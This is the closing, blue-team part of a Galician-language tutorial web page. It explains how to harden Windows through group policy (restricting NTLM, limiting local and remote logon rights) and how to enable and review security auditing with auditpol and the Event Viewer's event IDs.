<h5 id="aplicar-politicas-de-seguridade-mediante-gpeditmsc"><strong>Aplicar Políticas de Seguridade mediante <code>gpedit.msc</code></strong></h5>
<ul>
<li>
<p><strong>Desactivar autenticacións débiles (LM, NTLMv1) e aplicar restriccións á autenticación NTLM:</strong></p>
<ol>
<li>Presionar <code>Win + R</code> e escribir <code>gpedit.msc</code>.</li>
<li>Navegar a: <code>Configuración del equipo &gt; Configuración de Windows &gt; Configuración de seguridad &gt; Directivas locales &gt; Opciones de seguridad</code>.</li>
<li>Desactivar LM e NTLMv1:<ul>
<li>Configurar <code>Seguridad de red: Nivel de autenticación de LAN Manager</code> como <code>Enviar solo respuesta NTLMv2 y rechazar LM y NTLM</code>.</li>
</ul>
</li>
<li>Restrinxir NTLM:<ul>
<li>Configurar <code>Seguridad de red: Restringir NTLM: Tráfico NTLM entrante</code> como <code>Denegar todas las cuentas</code>.</li>
<li>Configurar <code>Seguridad de red: Restringir NTLM: Tráfico NTLM saliente a servidores remotos</code> como <code>Denegar todo</code>.</li>
</ul>
</li>
<li>Reiniciar o sistema para aplicar os cambios.</li>
</ol>
</li>
<li>
<p><strong>Configurar permisos de acceso local e remoto soamente para usuarios autorizados:</strong></p>
<ol>
<li>Presionar <code>Win + R</code> e escribir <code>gpedit.msc</code>.</li>
<li>Navegar a: <code>Configuración del equipo &gt; Configuración de Windows &gt; Configuración de seguridad &gt; Directivas locales &gt; Asignación de derechos de usuario</code>.</li>
<li>Configurar as políticas:<ul>
<li><code>Permitir el inicio de sesión local</code>: Agregar soamente os usuarios que necesitan acceso físico ao sistema.</li>
<li><code>Permitir inicio de sesión a través de Servicios de Escritorio Remoto</code>: Agregar soamente os usuarios ou grupos autorizados para acceso remoto.</li>
<li><code>Denegar el inicio de sesión local</code> e <code>Denegar inicio de sesión a través de Servicios de Escritorio Remoto</code>: Agregar usuarios non autorizados.</li>
</ul>
</li>
<li>Reiniciar o sistema para aplicar os cambios.</li>
</ol>
</li>
</ul>
<div class="admonition tip">
<p class="admonition-title">En <code>Directivas Locales</code>: A denegación de inicio de sesión prevalece sobre o permiso</p>
<p>En Windows, cando se configuran as políticas de inicio de sesión local ou remoto mediante <code>gpedit.msc</code>, é posible que un mesmo usuario ou grupo figure tanto nas directivas de <strong>permiso</strong> como nas de <strong>denegación</strong>. Neste caso, <strong>a política de denegación sempre prevalece</strong>.</p>
<p><strong>Exemplo</strong></p>
<p>Se o usuario <code>invitado</code> está configurado así:</p>
<ul>
<li><code>Permitir el inicio de sesión a través de Servicios de Escritorio Remoto</code></li>
<li><code>Denegar el inicio de sesión a través de Servicios de Escritorio Remoto</code></li>
</ul>
<p><strong>Resultado:</strong> <code>invitado</code> <strong>non poderá acceder por Escritorio Remoto</strong>, porque a política de denegación ten prioridade.</p>
<p>Isto permite aos administradores crear excepcións ou restricións específicas, mesmo se o usuario está nun grupo con acceso.</p>
</div>
<h5 id="monitoreo-continuo-con-auditpol"><strong>Monitoreo Continuo con <code>Auditpol</code></strong></h5>
<div class="admonition info">
<p class="admonition-title">Que é auditpol?</p>
<p><strong><code>auditpol</code></strong> é unha ferramenta de liña de comandos incluída en sistemas operativos <strong>Windows</strong> que permite <strong>consultar e configurar as políticas de auditoría de seguridade do sistema</strong>.</p>
<p>Estas políticas definen que tipos de eventos se rexistran no Visor de Eventos, como:<br />
- Logons e logoffs<br />
- Cambios en contas de usuario ou privilexios<br />
- Acceso a obxectos sensibles (ficheiros, rexistro...)  </p>
<p><code>auditpol</code> é especialmente útil para garantir que o sistema <strong>cumpre con políticas de seguridade e auditoría</strong>, e para detectar cambios non autorizados ou anómalos nas configuracións de control de eventos.</p>
</div>
<div class="language-text highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a>auditpol /get /category:* &gt; C:\audit-settings_%date:~6,4%-%date:~3,2%-%date:~0,2%_%time:~0,2%-%time:~3,2%.txt
</span></code></pre></div>
<p>Este comando realiza o seguinte:<br />
   - Exporta todas as configuracións de auditoría actuais do sistema.<br />
   - Gárdaas nun ficheiro de texto cuxo nome inclúe a data e a hora no formato <code>YYYY-MM-DD_HH-MM</code>.<br />
   - Este método permite ter un rexistro histórico de cambios na configuración de auditoría ao longo do tempo.</p>
<p><strong>Exemplo de ficheiro xerado:</strong> <code>audit-settings_2025-04-18_18-37.txt</code></p>
<p><strong>Recomendación:</strong> Executar este comando regularmente e comparar as configuracións antigas coas actuais para detectar modificacións non autorizadas.</p>
<ol>
<li>
<p><strong>Análise da configuración de auditoría do sistema con auditpol</strong></p>
<p>O ficheiro xerado por <code>auditpol /get /category:*</code> mostra que eventos de seguridade están sendo rexistrados actualmente en Windows. Isto é fundamental para saber se o sistema está preparado para detectar accións sospeitosas como movemento lateral ou persistencia.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a>    C:\Users\usuario&gt;more c:\audit-settings_2025-04-18_18-37.txt
</span><span id="__span-101-2"><a id="__codelineno-101-2" name="__codelineno-101-2" href="#__codelineno-101-2"></a>    Directiva de auditoría del sistema
</span><span id="__span-101-3"><a id="__codelineno-101-3" name="__codelineno-101-3" href="#__codelineno-101-3"></a>    Categoría o subcategoría                  Configuración
</span><span id="__span-101-4"><a id="__codelineno-101-4" name="__codelineno-101-4" href="#__codelineno-101-4"></a>    Sistema
</span><span id="__span-101-5"><a id="__codelineno-101-5" name="__codelineno-101-5" href="#__codelineno-101-5"></a>      Extensión del sistema de seguridad      Sin auditoría
</span><span id="__span-101-6"><a id="__codelineno-101-6" name="__codelineno-101-6" href="#__codelineno-101-6"></a>      Integridad del sistema                  Aciertos y errores
</span><span id="__span-101-7"><a id="__codelineno-101-7" name="__codelineno-101-7" href="#__codelineno-101-7"></a>      Controlador IPsec                       Sin auditoría
</span><span id="__span-101-8"><a id="__codelineno-101-8" name="__codelineno-101-8" href="#__codelineno-101-8"></a>      Otros eventos de sistema                Aciertos y errores
</span><span id="__span-101-9"><a id="__codelineno-101-9" name="__codelineno-101-9" href="#__codelineno-101-9"></a>      Cambio de estado de seguridad           Aciertos
</span><span id="__span-101-10"><a id="__codelineno-101-10" name="__codelineno-101-10" href="#__codelineno-101-10"></a>    Inicio/cierre de sesión
</span><span id="__span-101-11"><a id="__codelineno-101-11" name="__codelineno-101-11" href="#__codelineno-101-11"></a>      Inicio de sesión                        Aciertos y errores
</span><span id="__span-101-12"><a id="__codelineno-101-12" name="__codelineno-101-12" href="#__codelineno-101-12"></a>      Cerrar sesión                           Aciertos
</span><span id="__span-101-13"><a id="__codelineno-101-13" name="__codelineno-101-13" href="#__codelineno-101-13"></a>      Bloqueo de cuenta                       Aciertos
</span><span id="__span-101-14"><a id="__codelineno-101-14" name="__codelineno-101-14" href="#__codelineno-101-14"></a>      Modo principal de IPsec                 Sin auditoría
</span><span id="__span-101-15"><a id="__codelineno-101-15" name="__codelineno-101-15" href="#__codelineno-101-15"></a>      Modo rápido de IPsec                    Sin auditoría
</span><span id="__span-101-16"><a id="__codelineno-101-16" name="__codelineno-101-16" href="#__codelineno-101-16"></a>      Modo extendido de IPsec                 Sin auditoría
</span><span id="__span-101-17"><a id="__codelineno-101-17" name="__codelineno-101-17" href="#__codelineno-101-17"></a>      Inicio de sesión especial               Aciertos
</span><span id="__span-101-18"><a id="__codelineno-101-18" name="__codelineno-101-18" href="#__codelineno-101-18"></a>      Otros eventos de inicio y cierre de sesiónSin auditoría
</span><span id="__span-101-19"><a id="__codelineno-101-19" name="__codelineno-101-19" href="#__codelineno-101-19"></a>      Servidor de directivas de redes         Aciertos y errores
</span><span id="__span-101-20"><a id="__codelineno-101-20" name="__codelineno-101-20" href="#__codelineno-101-20"></a>      Notificaciones de usuario o dispositivo Sin auditoría
</span><span id="__span-101-21"><a id="__codelineno-101-21" name="__codelineno-101-21" href="#__codelineno-101-21"></a>      Pertenencia a grupos                    Sin auditoría
</span><span id="__span-101-22"><a id="__codelineno-101-22" name="__codelineno-101-22" href="#__codelineno-101-22"></a>    Acceso de objetos
</span><span id="__span-101-23"><a id="__codelineno-101-23" name="__codelineno-101-23" href="#__codelineno-101-23"></a>      Sistema de archivos                     Sin auditoría
</span><span id="__span-101-24"><a id="__codelineno-101-24" name="__codelineno-101-24" href="#__codelineno-101-24"></a>      Registro                                Sin auditoría
</span><span id="__span-101-25"><a id="__codelineno-101-25" name="__codelineno-101-25" href="#__codelineno-101-25"></a>      Objeto de kernel                        Sin auditoría
</span><span id="__span-101-26"><a id="__codelineno-101-26" name="__codelineno-101-26" href="#__codelineno-101-26"></a>      SAM                                     Sin auditoría
</span><span id="__span-101-27"><a id="__codelineno-101-27" name="__codelineno-101-27" href="#__codelineno-101-27"></a>      Servicios de certificación              Sin auditoría
</span><span id="__span-101-28"><a id="__codelineno-101-28" name="__codelineno-101-28" href="#__codelineno-101-28"></a>      Aplicación generada                     Sin auditoría
</span><span id="__span-101-29"><a id="__codelineno-101-29" name="__codelineno-101-29" href="#__codelineno-101-29"></a>      Manipulación de identificadores         Sin auditoría
</span><span id="__span-101-30"><a id="__codelineno-101-30" name="__codelineno-101-30" href="#__codelineno-101-30"></a>      Recurso compartido de archivos          Sin auditoría
</span><span id="__span-101-31"><a id="__codelineno-101-31" name="__codelineno-101-31" href="#__codelineno-101-31"></a>      Colocación de paquetes de Plataforma de filtradoSin auditoría
</span><span id="__span-101-32"><a id="__codelineno-101-32" name="__codelineno-101-32" href="#__codelineno-101-32"></a>      Conexión de Plataforma de filtrado      Sin auditoría
</span><span id="__span-101-33"><a id="__codelineno-101-33" name="__codelineno-101-33" href="#__codelineno-101-33"></a>      Otros eventos de acceso a objetos       Sin auditoría
</span><span id="__span-101-34"><a id="__codelineno-101-34" name="__codelineno-101-34" href="#__codelineno-101-34"></a>      Recurso compartido de archivos detalladoSin auditoría
</span><span id="__span-101-35"><a id="__codelineno-101-35" name="__codelineno-101-35" href="#__codelineno-101-35"></a>      Almacenamiento extraíble                Sin auditoría
</span><span id="__span-101-36"><a id="__codelineno-101-36" name="__codelineno-101-36" href="#__codelineno-101-36"></a>      Almacenamiento provisional de directiva centralSin auditoría
</span><span id="__span-101-37"><a id="__codelineno-101-37" name="__codelineno-101-37" href="#__codelineno-101-37"></a>    Uso de privilegios
</span><span id="__span-101-38"><a id="__codelineno-101-38" name="__codelineno-101-38" href="#__codelineno-101-38"></a>      Uso de privilegio no confidencial       Sin auditoría
</span><span id="__span-101-39"><a id="__codelineno-101-39" name="__codelineno-101-39" href="#__codelineno-101-39"></a>      Otros eventos de uso de privilegio      Sin auditoría
</span><span id="__span-101-40"><a id="__codelineno-101-40" name="__codelineno-101-40" href="#__codelineno-101-40"></a>      Uso de privilegio confidencial          Sin auditoría
</span><span id="__span-101-41"><a id="__codelineno-101-41" name="__codelineno-101-41" href="#__codelineno-101-41"></a>    Seguimiento detallado
</span><span id="__span-101-42"><a id="__codelineno-101-42" name="__codelineno-101-42" href="#__codelineno-101-42"></a>      Creación del proceso                    Sin auditoría
</span><span id="__span-101-43"><a id="__codelineno-101-43" name="__codelineno-101-43" href="#__codelineno-101-43"></a>      Finalización del proceso                Sin auditoría
</span><span id="__span-101-44"><a id="__codelineno-101-44" name="__codelineno-101-44" href="#__codelineno-101-44"></a>      Actividad DPAPI                         Sin auditoría
</span><span id="__span-101-45"><a id="__codelineno-101-45" name="__codelineno-101-45" href="#__codelineno-101-45"></a>      Eventos de RPC                          Sin auditoría
</span><span id="__span-101-46"><a id="__codelineno-101-46" name="__codelineno-101-46" href="#__codelineno-101-46"></a>      Eventos Plug and Play                   Sin auditoría
</span><span id="__span-101-47"><a id="__codelineno-101-47" name="__codelineno-101-47" href="#__codelineno-101-47"></a>      Eventos de ajuste de derecho de token   Sin auditoría
</span><span id="__span-101-48"><a id="__codelineno-101-48" name="__codelineno-101-48" href="#__codelineno-101-48"></a>    Cambio de plan
</span><span id="__span-101-49"><a id="__codelineno-101-49" name="__codelineno-101-49" href="#__codelineno-101-49"></a>      Cambio en la directiva de auditoría     Aciertos
</span><span id="__span-101-50"><a id="__codelineno-101-50" name="__codelineno-101-50" href="#__codelineno-101-50"></a>      Cambio de la directiva de autenticación Aciertos
</span><span id="__span-101-51"><a id="__codelineno-101-51" name="__codelineno-101-51" href="#__codelineno-101-51"></a>      Cambio de la directiva de autorización  Sin auditoría
</span><span id="__span-101-52"><a id="__codelineno-101-52" name="__codelineno-101-52" href="#__codelineno-101-52"></a>      Cambio de la directiva del nivel de reglas de MPSSVCSin auditoría
</span><span id="__span-101-53"><a id="__codelineno-101-53" name="__codelineno-101-53" href="#__codelineno-101-53"></a>      Cambio de la directiva de Plataforma de filtradoSin auditoría
</span><span id="__span-101-54"><a id="__codelineno-101-54" name="__codelineno-101-54" href="#__codelineno-101-54"></a>      Otros eventos de cambio de directivas   Sin auditoría
</span><span id="__span-101-55"><a id="__codelineno-101-55" name="__codelineno-101-55" href="#__codelineno-101-55"></a>    Administración de cuentas
</span><span id="__span-101-56"><a id="__codelineno-101-56" name="__codelineno-101-56" href="#__codelineno-101-56"></a>      Administración de cuentas de equipo     Sin auditoría
</span><span id="__span-101-57"><a id="__codelineno-101-57" name="__codelineno-101-57" href="#__codelineno-101-57"></a>      Administración de grupos de seguridad   Aciertos
</span><span id="__span-101-58"><a id="__codelineno-101-58" name="__codelineno-101-58" href="#__codelineno-101-58"></a>      Administración de grupos de distribuciónSin auditoría
</span><span id="__span-101-59"><a id="__codelineno-101-59" name="__codelineno-101-59" href="#__codelineno-101-59"></a>      Administración de grupos de aplicacionesSin auditoría
</span><span id="__span-101-60"><a id="__codelineno-101-60" name="__codelineno-101-60" href="#__codelineno-101-60"></a>      Otros eventos de administración de cuentasSin auditoría
</span><span id="__span-101-61"><a id="__codelineno-101-61" name="__codelineno-101-61" href="#__codelineno-101-61"></a>      Administración de cuentas de usuario    Aciertos
</span><span id="__span-101-62"><a id="__codelineno-101-62" name="__codelineno-101-62" href="#__codelineno-101-62"></a>    Acceso DS
</span><span id="__span-101-63"><a id="__codelineno-101-63" name="__codelineno-101-63" href="#__codelineno-101-63"></a>      Acceso del servicio de directorio       Sin auditoría
</span><span id="__span-101-64"><a id="__codelineno-101-64" name="__codelineno-101-64" href="#__codelineno-101-64"></a>      Cambios de servicio de directorio       Sin auditoría
</span><span id="__span-101-65"><a id="__codelineno-101-65" name="__codelineno-101-65" href="#__codelineno-101-65"></a>      Replicación de servicio de directorio   Sin auditoría
</span><span id="__span-101-66"><a id="__codelineno-101-66" name="__codelineno-101-66" href="#__codelineno-101-66"></a>      Replicación de servicio de directorio detalladaSin auditoría
</span><span id="__span-101-67"><a id="__codelineno-101-67" name="__codelineno-101-67" href="#__codelineno-101-67"></a>    Inicio de sesión de la cuenta
</span><span id="__span-101-68"><a id="__codelineno-101-68" name="__codelineno-101-68" href="#__codelineno-101-68"></a>      Operaciones de vales de servicio KerberosSin auditoría
</span><span id="__span-101-69"><a id="__codelineno-101-69" name="__codelineno-101-69" href="#__codelineno-101-69"></a>      Otros eventos de inicio de sesión de cuentasSin auditoría
</span><span id="__span-101-70"><a id="__codelineno-101-70" name="__codelineno-101-70" href="#__codelineno-101-70"></a>      Servicio de autenticación Kerberos      Sin auditoría
</span><span id="__span-101-71"><a id="__codelineno-101-71" name="__codelineno-101-71" href="#__codelineno-101-71"></a>      Validación de credenciales              Sin auditoría
</span></code></pre></div>
<p><strong>Que está ben configurado neste sistema</strong></p>
<ul>
<li><strong>Integridade do sistema</strong>: rexístranse acertos e erros → útil para cambios no núcleo.</li>
<li><strong>Inicio e peche de sesión</strong>: rexístranse logins exitosos e fallidos.</li>
<li><strong>Administración de contas</strong>: cambios en usuarios e grupos son rexistrados.</li>
<li><strong>Cambios na política de seguridade</strong>: activado.</li>
</ul>
<p><strong>Problemas detectados (auditoría desactivada)</strong></p>
<ul>
<li><strong>Creación de procesos (<code>Creación del proceso</code>)</strong>: sen rexistro → crítico para detectar execución de binarios.</li>
<li><strong>Acceso a obxectos (rexistro, ficheiros, SAM, etc.)</strong>: todo está en “Sen auditoría”.</li>
<li><strong>Uso de privilexios sensibles (<code>SeDebugPrivilege</code>, etc.)</strong>: sen rexistro.</li>
<li><strong>Seguimento detallado</strong> en xeral: desactivado → impide detección forense completa.</li>
</ul>
<p><strong>Conclusión</strong></p>
<p>Esta configuración é <strong>mínima pero funcional para logins e cambios de contas</strong>, pero <strong>non detectará execucións de ferramentas como <code>schtasks.exe</code>, <code>cmd.exe</code>, <code>payload.exe</code>, etc.</strong>. Para visibilidade completa, recoméndase:</p>
<ol>
<li>
<p>Activar auditoría de creación de procesos</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a><span class="n">auditpol</span> <span class="p">/</span><span class="nb">set </span><span class="p">/</span><span class="n">subcategory</span><span class="p">:</span><span class="s2">&quot;Creación del proceso&quot;</span> <span class="p">/</span><span class="n">success</span><span class="p">:</span><span class="n">enable</span> <span class="p">/</span><span class="n">failure</span><span class="p">:</span><span class="n">enable</span>
</span></code></pre></div>
<p>Isto permite rexistrar cada proceso novo lanzado no sistema, útil para detectar execucións de ferramentas como <code>cmd.exe</code>, <code>powershell.exe</code>, <code>schtasks.exe</code> ou payloads.</p>
</li>
<li>
<p>Activar auditoría de acceso ao rexistro</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a><span class="n">auditpol</span> <span class="p">/</span><span class="nb">set </span><span class="p">/</span><span class="n">subcategory</span><span class="p">:</span><span class="s2">&quot;Registro&quot;</span> <span class="p">/</span><span class="n">success</span><span class="p">:</span><span class="n">enable</span> <span class="p">/</span><span class="n">failure</span><span class="p">:</span><span class="n">enable</span>
</span></code></pre></div>
<p>Recomendado para detectar manipulacións persistentes a través de claves como <code>Run</code>, <code>RunOnce</code>, <code>Winlogon</code>, etc.</p>
</li>
<li>
<p>Activar auditoría de uso de privilexios</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a><span class="n">auditpol</span> <span class="p">/</span><span class="nb">set </span><span class="p">/</span><span class="n">subcategory</span><span class="p">:</span><span class="s2">&quot;Uso de privilegio no confidencial&quot;</span> <span class="p">/</span><span class="n">success</span><span class="p">:</span><span class="n">enable</span> <span class="p">/</span><span class="n">failure</span><span class="p">:</span><span class="n">enable</span>
</span><span id="__span-104-2"><a id="__codelineno-104-2" name="__codelineno-104-2" href="#__codelineno-104-2"></a><span class="n">auditpol</span> <span class="p">/</span><span class="nb">set </span><span class="p">/</span><span class="n">subcategory</span><span class="p">:</span><span class="s2">&quot;Uso de privilegio confidencial&quot;</span> <span class="p">/</span><span class="n">success</span><span class="p">:</span><span class="n">enable</span> <span class="p">/</span><span class="n">failure</span><span class="p">:</span><span class="n">enable</span>
</span></code></pre></div>
<p>Isto permite detectar eventos onde se utilizan permisos elevados como <code>SeDebugPrivilege</code> ou <code>SeTcbPrivilege</code>.</p>
</li>
<li>
<p>Activar auditoría de acceso a ficheiros e obxectos</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a><span class="n">auditpol</span> <span class="p">/</span><span class="nb">set </span><span class="p">/</span><span class="n">subcategory</span><span class="p">:</span><span class="s2">&quot;Sistema de archivos&quot;</span> <span class="p">/</span><span class="n">success</span><span class="p">:</span><span class="n">enable</span> <span class="p">/</span><span class="n">failure</span><span class="p">:</span><span class="n">enable</span>
</span><span id="__span-105-2"><a id="__codelineno-105-2" name="__codelineno-105-2" href="#__codelineno-105-2"></a><span class="n">auditpol</span> <span class="p">/</span><span class="nb">set </span><span class="p">/</span><span class="n">subcategory</span><span class="p">:</span><span class="s2">&quot;Objeto de kernel&quot;</span> <span class="p">/</span><span class="n">success</span><span class="p">:</span><span class="n">enable</span> <span class="p">/</span><span class="n">failure</span><span class="p">:</span><span class="n">enable</span>
</span></code></pre></div>
<p>Necesario para ver actividades sobre recursos sensibles.</p>
</li>
<li>
<p>Activar seguimento detallado</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a><span class="n">auditpol</span> <span class="p">/</span><span class="nb">set </span><span class="p">/</span><span class="n">subcategory</span><span class="p">:</span><span class="s2">&quot;Actividad DPAPI&quot;</span> <span class="p">/</span><span class="n">success</span><span class="p">:</span><span class="n">enable</span> <span class="p">/</span><span class="n">failure</span><span class="p">:</span><span class="n">enable</span>
</span><span id="__span-106-2"><a id="__codelineno-106-2" name="__codelineno-106-2" href="#__codelineno-106-2"></a><span class="n">auditpol</span> <span class="p">/</span><span class="nb">set </span><span class="p">/</span><span class="n">subcategory</span><span class="p">:</span><span class="s2">&quot;Eventos de RPC&quot;</span> <span class="p">/</span><span class="n">success</span><span class="p">:</span><span class="n">enable</span> <span class="p">/</span><span class="n">failure</span><span class="p">:</span><span class="n">enable</span>
</span><span id="__span-106-3"><a id="__codelineno-106-3" name="__codelineno-106-3" href="#__codelineno-106-3"></a><span class="n">auditpol</span> <span class="p">/</span><span class="nb">set </span><span class="p">/</span><span class="n">subcategory</span><span class="p">:</span><span class="s2">&quot;Creación del proceso&quot;</span> <span class="p">/</span><span class="n">success</span><span class="p">:</span><span class="n">enable</span> <span class="p">/</span><span class="n">failure</span><span class="p">:</span><span class="n">enable</span>
</span></code></pre></div>
<p>Isto axuda a detectar procesos encadeados ou movemento lateral baseado en chamadas remotas.</p>
</li>
</ol>
</li>
<li>
<p><strong>Onde ver os rexistros xerados por auditpol en Windows</strong></p>
<p>Cando activas auditoría avanzada cun comando <code>auditpol</code>, os eventos que se rexistran <strong>non aparecen no log de Sysmon</strong>, senón nun log nativo do sistema chamado <strong>Seguridad</strong>.</p>
<ul>
<li><strong>Ruta no Visor de Eventos</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a>Visor de eventos &gt;
</span><span id="__span-107-2"><a id="__codelineno-107-2" name="__codelineno-107-2" href="#__codelineno-107-2"></a>  Registros de Windows &gt;
</span><span id="__span-107-3"><a id="__codelineno-107-3" name="__codelineno-107-3" href="#__codelineno-107-3"></a>    Seguridad
</span></code></pre></div>
<p>Aquí é onde se gardan os eventos do sistema relacionados con:<br />
  - Logins<br />
  - Execucións de procesos<br />
  - Cambios en contas<br />
  - Uso de privilexios<br />
  - Acceso a rexistro e obxectos  </p>
<ul>
<li>
<p><strong>Eventos comúns segundo a subcategoría auditada</strong></p>
<table>
<thead>
<tr>
<th>Acción auditada</th>
<th>Evento ID</th>
<th>Significado</th>
</tr>
</thead>
<tbody>
<tr>
<td>Creación de proceso</td>
<td><code>4688</code></td>
<td>Execución dun proceso (<code>cmd.exe</code>, <code>schtasks.exe</code>)</td>
</tr>
<tr>
<td>Inicio de sesión exitoso</td>
<td><code>4624</code></td>
<td>Login correcto</td>
</tr>
<tr>
<td>Fallo de login</td>
<td><code>4625</code></td>
<td>Intento fallido</td>
</tr>
<tr>
<td>Uso de privilexios</td>
<td><code>4672</code>, <code>4673</code></td>
<td>Uso de <code>SeDebugPrivilege</code>, etc.</td>
</tr>
<tr>
<td>Cambio de clave de rexistro</td>
<td><code>4657</code></td>
<td>Persistencia ou manipulación</td>
</tr>
<tr>
<td>Creación/activación de conta</td>
<td><code>4720</code>, <code>4722</code></td>
<td>Alta ou desbloqueo</td>
</tr>
</tbody>
</table>
</li>
<li>
<p><strong>Como buscar</strong></p>
<ol>
<li>Abre o Visor de Eventos</li>
<li>Vai a <code>Seguridad</code></li>
<li>Fai clic en <strong>"Filtrar registro actual"</strong></li>
<li>Introduce o ID do evento (ex: <code>4688</code>) ou palabra clave</li>
</ol>
</li>
</ul>
</li>
</ol>
<div class="admonition info">
<p class="admonition-title">Activar toda a auditoría dispoñible en Windows cun único comando</p>
<p>Se precisas rexistrar todos os eventos posibles de auditoría de seguridade en Windows (para fins forenses, detección de intrusións ou monitorización completa), podes activar todas as subcategorías de auditoría ao mesmo tempo usando <code>auditpol</code>:</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a><span class="n">auditpol</span> <span class="p">/</span><span class="nb">set </span><span class="p">/</span><span class="n">category</span><span class="p">:*</span> <span class="p">/</span><span class="n">success</span><span class="p">:</span><span class="n">enable</span> <span class="p">/</span><span class="n">failure</span><span class="p">:</span><span class="n">enable</span>
</span></code></pre></div>
<p>Este comando:</p>
<ul>
<li>Recorre automaticamente todas as categorías e subcategorías dispoñibles.</li>
<li>Activa a auditoría de:  <ul>
<li>Aciertos (success)  </li>
<li>Erros (failure)  </li>
</ul>
</li>
<li>Afecta a:  <ul>
<li>Creación de procesos, rexistro, logins, cambios en contas, uso de privilexios, etc.</li>
</ul>
</li>
</ul>
<div class="admonition warning">
<p class="admonition-title">Advertencia</p>
<ul>
<li>Este nivel de auditoría pode xerar <strong>grandes volumes de eventos</strong> no log de seguridade (<code>Seguridad</code>).</li>
<li>É ideal para contornas de laboratorio ou sistemas críticos, pero <strong>pode ter impacto en rendemento ou disco</strong> en produción.</li>
</ul>
</div>
</div>
<p><em>Complementa esta auditoría con Sysmon para unha visión máis detallada de procesos, rede e persistencia.</em></p>
<hr />
<h2 id="conclusion"><strong>Conclusión</strong></h2>
<p>Esta guía ofrece un procedemento práctico e detallado para realizar simulacións de ataques comúns (Reverse Shell, Movemento Lateral, Persistencia) con VIPER e aplicar contramedidas efectivas (bastionado) desde a perspectiva do Blue Team. Simular estes ataques axuda ás organizacións a comprender as súas debilidades e a mellorar a súa postura de seguridade. Seguir estas recomendacións mellorará significativamente a resiliencia da infraestrutura fronte a ataques reais.</p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Volver ao principio
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.copy", "content.code.select", "content.code.annotate", "navigation.tabs", "navigation.tabs.sticky", "navigation.top"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copiado no cortapapeis", "clipboard.copy": "Copiar no cortapapeis", "search.result.more.one": "1 m\u00e1is nesta p\u00e1xina", "search.result.more.other": "# m\u00e1is nesta p\u00e1xina", "search.result.none": "Sen resultados", "search.result.one": "1 resultado atopado", "search.result.other": "# resultados atopados", "search.result.placeholder": "Insira un termo", "search.result.term.missing": "Falta", "select.version": "Seleccionar version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.83f73b43.min.js"></script>
      
        <script src="../../js/medium-zoom.min.js"></script>
      
        <script src="../../js/opera.js"></script>
      
        <script src="../../js/zoom.js"></script>
      
    
  </body>
</html>